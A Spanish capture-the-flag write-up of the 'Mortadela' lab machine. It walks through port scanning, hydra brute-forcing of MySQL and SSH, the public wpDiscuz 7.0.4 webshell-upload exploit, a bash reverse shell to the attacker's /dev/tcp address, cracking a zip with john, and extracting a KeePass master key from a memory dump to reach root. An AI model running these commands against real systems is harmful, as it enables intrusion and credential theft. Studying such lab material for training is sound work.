- Tags: #KepassXC #MySQL #ExploitKeepass
# Writeup Template: Maquina `[ Mortadela ]`

- Tags: #Mortadela
- Dificultad: `[ Facil ]`
- Plataforma: `[ The Hackers Labs ]`

---
## Configuracion del Entorno
**Nota:** Pagina oficcioal donde descargo los laboratorios: [The Hackers Labs](https://labs.thehackerslabs.com/)
- Descargamos el archivo **( .ova )**
- Descomprimimos el archivo **zip**
- Importamos el **ova** en **virtualBox**

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
192.168.100.36
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 192.168.100.36 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 192.168.100.36
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 192.168.100.36 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.100.36 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80,3306 192.168.100.36 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.57 ((DebianMantic))
3306/tcp open  mysql   MariaDB 5.5.5-10.11.6
```
---

## Enumeracion de [Servicio Web Principal](WordPress)
direccion **URL** del servicio:
```bash
http://192.168.100.36/wordpress/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://192.168.100.36/wordpress/
http://192.168.100.36/wordpress/ [200 OK] Apache[2.4.57], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.57 (Debian)], IP[192.168.100.36], MetaGenerator[WordPress 6.4.3], Script, Title[Mortadela], UncommonHeaders[link], WordPress[6.4.3]
```
### Descubrimiento de Archivos y Rutas
```bash
wpscan --url http://192.168.100.36/wordpress --enumerate u,vp,vt,tt,cb,dbe --plugins-detection aggressive
```

- **Hallazgos**:
```bash
http://192.168.100.36/wordpress/readme.html
http://192.168.100.36/wordpress/wp-content/uploads/
http://192.168.100.36/wordpress/wp-cron.php
 WordPress version 6.4.3 identified (Insecure, released on 2024-01-30) # Version vulnerable
```

Tenemso un usuario valido para el **gestorCMS**
```bash
[i] User(s) Identified:

[+] mortadela
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```

Mientras realizaremos un ataque de fuerza bruta, en lo que seguimos enumerando el **gestorCMS**
```bash
wpscan --url http://192.168.100.36/wordpress/wp-login.php --passwords /usr/share/wordlists/rockyou.txt --usernames mortadela
```
### Enumeracion MySQL
Ahora enumeramos este servicion con scripts de reconocimiento basico:
```bash
nmap -p 3306 --script mysql-info,mysql-empty-password 192.168.100.36
```

- **Host**: 192.168.100.36 (dirección IP del servidor)
- **Puerto**: 3306/tcp (puerto estándar de MySQL/MariaDB)
- **Estado**: open (el puerto está abierto y accesible)
- **Protocol: 10** - Versión del protocolo de comunicación
- **Version: 5.5.5-10.11.6-MariaDB-0+deb12u1** - Nos revela:
    - Es una distribución **MariaDB** (fork de MySQL)
    - Versión principal: **10.11.6**
    - Compilado para **Debian 12** (deb12u1)
- **SupportsLoadDataLocal**: Permite carga de archivos locales (¡potencial vector de ataque!)
1. **Posible vector de ataque**:
    - El soporte para `LoadDataLocal` podría permitir lectura de archivos con los privilegios adecuados
    - La autenticación con `mysql_native_password` es vulnerable a ataques de downgrade
---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Intentaremos realizar un ataque de fuerza bruta sobre el servicio de **MySQL**
Donde el diccianario **users.txt** cointrempla estos dos usuarios: **( root | mortadela )**
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.100.36 mysql
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
```

Tenemos un usuario valido para **mysql**
```bash
[DATA] attacking mysql://192.168.100.36:3306/
[3306][mysql] host: 192.168.100.36   login: root   password: cassandra
```

Esta credenciales tambien las probaramos por **ssh**, para ver si es que existe reutilizacion de credenciales:
```bash
root: cassandra
root: mortadela
mortadela: cassandra
mortadela: root
```

pero ninguna funciona, mientras dejaraemos un ataque por fuerza bruta en **ssh** para estos usuarios:
```bash
hydra -l mortadela -P /usr/share/wordlists/rockyou.txt -f -t 4 ssh://192.168.100.36
```

Procedemos con al enumeracion de **MySQL** ya que tenemos credenciales validas
```bash
mysql -h 192.168.100.34 -u root -p
```

No logramos conectarnos, pero podemos empezar a buscar exploits del plugin de **wordpress**
```bash
mysql -h 192.168.100.34:3306 -u root -p
Enter password: cassandra
ERROR 2005 (HY000): Unknown server host '192.168.100.34:3306' (-2)
```

Tenemso plugins
```bash
[+] akismet
 | Location: http://192.168.100.36/wordpress/wp-content/plugins/akismet/
[+] wpdiscuz
 | Location: http://192.168.100.36/wordpress/wp-content/plugins/wpdiscuz/
```

Si revismos su archivo **readme** del pluguin **wpdiscuz**
```bash
Readme: http://192.168.100.36/wordpress/wp-content/plugins/wpdiscuz/readme.txt
```

Vemos lo siguiente:
```bash
del plugin wpdiscuz explicame esto

=== Comments - wpDiscuz ===
Contributors: gVectors Team
Tags: comment, comments, ajax comments, comment form, comment fields
Requires at least: 5.0
Tested up to: 5.4
Stable tag: 7.0.4 # Version actual
Requires PHP: 5.4 and higher
License: GPLv3
License URI: https://www.gnu.org/licenses/gpl-3.0.html
```

Ahora sabiendo su version, buscamos un exploit:
```bash
searchsploit wpDiscuz 7.0.4
```

Tenemos lo siguiente:
```bash
------------------------------------------------------------------------------------ ---------------------
 Exploit Title                                                             |  Path
------------------------------------------------------------------------------------ ---------------------
WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated)  | php/webapps/49967.py
```

Nos descargamos este exploit
```bash
searchsploit -m php/webapps/49967.py
  Exploit: WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated)
      URL: https://www.exploit-db.com/exploits/49967
     Path: /usr/share/exploitdb/exploits/php/webapps/49967.py
    Codes: CVE-2020-24186
 Verified: False
File Type: Python script, Unicode text, UTF-8 text executable, with very long lines (864)
Copied to: /home/kali/labs/content/49967.py
```

```bash
python3 49967.py -u http://192.168.100.36/wordpress -p /index.php/2024/04/01/hola-mundo/
```

Vemos lo siguiente:
```bash
[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
[-] File Upload Bypass Vulnerability - PHP Webshell Upload
[-] CVE: CVE-2020-24186
[-] https://github.com/hevox
--------------------------------------------------------------- 

[+] Response length:[93974] | code:[200]
[!] Got wmuSecurity value: a0f583222a
[!] Got wmuSecurity value: 1 

[+] Generating random name for Webshell...
[!] Generated webshell name: occrtcufkfsriru

[!] Trying to Upload Webshell..
[+] Upload Success... Webshell path:url&quot;:&quot;http://192.168.0.108/wordpress/wp-content/uploads/2025/08/occrtcufkfsriru-1755025176.4199.php&quot; 

>
```

Vemos la ruta donde se almaceno nuestra **revershell**
```bash
[+] Upload Success... Webshell path:url&quot;:&quot;http://192.168.0.108/wordpress/wp-content/uploads/2025/08/occrtcufkfsriru-1755025176.4199.php&quot;
```

Probamos a ejecutra comandos:
```bash
http://192.168.100.36/wordpress/wp-content/uploads/2025/08/occrtcufkfsriru-1755025176.4199.php?cmd=whoami
```

En la web vemos lo siguiente:
```bash
GIF689a; www-data 
```
### Intrusion
Ahora nos ponemos en escucha para ganar acceso al objetivo
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
192.168.100.36/wordpress/wp-content/uploads/2025/08/occrtcufkfsriru-1755025176.4199.php?cmd=bash -c 'exec bash -i %26>/dev/tcp/192.168.100.24/443 <%261'
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Enumeracion Usuarios del sistema
cat /etc/passwd | grep "sh"

root:x:0:0:root:/root:/bin/bash
mortadela:x:1000:1000:mortadela,,,:/home/mortadela:/bin/bash
```

### Explotacion de Privilegios

###### Usuario `[ www-data ]`:
Revisando este archivo **wp-config.php** tenemos lo siguiente:
```php
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wordpress' );

/** Database password */
define( 'DB_PASSWORD', 'lolalolitalola' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

Nos conectamos a la base de datos:
```bash
mysql -h localhost -u wordpress -p
Enter password: lolalolitalola
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 250971
Server version: 10.11.6-MariaDB-0+deb12u1 Debian 12
```

Una ves conectados enumeramos las bases de datos:
```bash
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| wordpress          |
+--------------------+
```

Cambiamos de base de datos:
```bash
MariaDB [(none)]> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

Listamos las tablas para esa base de datos:
```bash
MariaDB [wordpress]> show tables;
+-----------------------------+
| Tables_in_wordpress         |
+-----------------------------+
| wp_commentmeta              |
| wp_comments                 |
| wp_links                    |
| wp_options                  |
| wp_postmeta                 |
| wp_posts                    |
| wp_term_relationships       |
| wp_term_taxonomy            |
| wp_termmeta                 |
| wp_terms                    |
| wp_usermeta                 |
| wp_users                    |
| wp_wc_avatars_cache         |
| wp_wc_comments_subscription |
| wp_wc_feedback_forms        |
| wp_wc_follow_users          |
| wp_wc_phrases               |
| wp_wc_users_rated           |
| wp_wc_users_voted           |
+-----------------------------+
```

Vemos las columnas:
```bash
MariaDB [wordpress]> desc wp_users;
+---------------------+---------------------+------+-----+---------------------+----------------+
| Field               | Type                | Null | Key | Default             | Extra          |
+---------------------+---------------------+------+-----+---------------------+----------------+
| ID                  | bigint(20) unsigned | NO   | PRI | NULL                | auto_increment |
| user_login          | varchar(60)         | NO   | MUL |                     |                |
| user_pass           | varchar(255)        | NO   |     |                     |                |
| user_nicename       | varchar(50)         | NO   | MUL |                     |                |
| user_email          | varchar(100)        | NO   | MUL |                     |                |
| user_url            | varchar(100)        | NO   |     |                     |                |
| user_registered     | datetime            | NO   |     | 0000-00-00 00:00:00 |                |
| user_activation_key | varchar(255)        | NO   |     |                     |                |
| user_status         | int(11)             | NO   |     | 0                   |                |
| display_name        | varchar(250)        | NO   |     |                     |                |
+---------------------+---------------------+------+-----+---------------------+----------------+
```

Seleccionamos los datos de esta tabla:
```bash
MariaDB [wordpress]> select * from wp_users;
+----+------------+------------------------------------+---------------+
| ID | user_login | user_pass                          | user_nicename |
+----+------------+------------------------------------+---------------+
|  1 | mortadela  | $P$Bsftyr1agoUTYzf79H.zkgGURjn.4e0 | mortadela     |
+----+------------+------------------------------------+---------------+
```

LIstandno igual lo que existe en el directioro **opt**
```bash
ls -la /opt

-rw-r--r--  1 root root 93052465 Apr  1  2024 muyconfidencial.zip
```

Ahora tenemos que ver si existe el binario de python para poder transferirirnos a nuestra maquina de atacante, este archivo:
```bash
which python3 
/usr/bin/python3
```

Ahora nos podemos montar un servidor con python
```bash
www-data@mortadela:/opt$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Descargamos el archivo
```bash
 wget http://192.168.100.36:8080/muyconfidencial.zip
```

Como estoy seguro que necesitamos una contrasena para extraer el contenido, Procedemos a realizar lo siguiente:
```bash
zip2john muyconfidencial.zip > hash
```

Ahora realizamos un ataque de fuerza bruta para obtener la passaword
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pinkgirl         (muyconfidencial.zip) # Contrasena
```

Ahora si que procedemos a extraer el archvios:
```bash
 7z x muyconfidencial.zip

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:16 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 93052465 bytes (89 MiB)

Extracting archive: muyconfidencial.zip
--
Path = muyconfidencial.zip
Type = zip
Physical Size = 93052465

    
Enter password (will not be echoed):
Everything is Ok    

Files: 2
Size:       267522141
Compressed: 93052465
```

Tenemos dos archivos:
```bash
KeePass.DMP, Database.kdb
```

Ahora para poder ver el contenido necesitamos un exploit para ello nos descargamos el siguiente exploit
```bash
git clone https://github.com/z-jxy/keepass_dump.git
```

Nos da lo siguiente:
```bash
python3 keepass_dump.py -f KeePass.DMP
[*] Searching for masterkey characters
[-] Couldn't find jump points in file. Scanning with slower method.
[*] 0:  {UNKNOWN}
[*] 1:  a
[*] 2:  r
[*] 3:  i
[*] 4:  t
[*] 5:  r
[*] 6:  i
[*] 7:  n
[*] 8:  i
[*] 9:  1
[*] 10: 2
[*] 11: 3
[*] 12: 4
[*] 13: 5
[*] Extracted: {UNKNOWN}aritrini12345
```

Tenemos la contrasena pero el primer caracter falta, asi que lo probaremos manual
Lanzamos keepass para raelizar manualmente
```bash
flatpak run org.keepassxc.KeePassXC Database.kdbx
```

Logramos determinar que la contrasnea es:
```bash
Maritrini12345
```

y la password para root es: 
```bash
Juanikonokukunero
```

```bash
# Comando para escalar al usuario: ( root )
su root # ( Juanikonokukunero )
```

---

## Evidencia de Compromiso
Flago de user:
```bash
ls -la /home/mortadela

-rw-r--r-- 1 mortadela mortadela   20 abr  2  2024 user.txt
```

Flago de root
```bash
# Captura de pantalla o output final
ls -la

-rw-r--r--  1 root root   26 abr  2  2024 root.txt
```

```bash
echo -e "\n[+] Hacked: $(whoami)\n"

[+] Hacked: root
```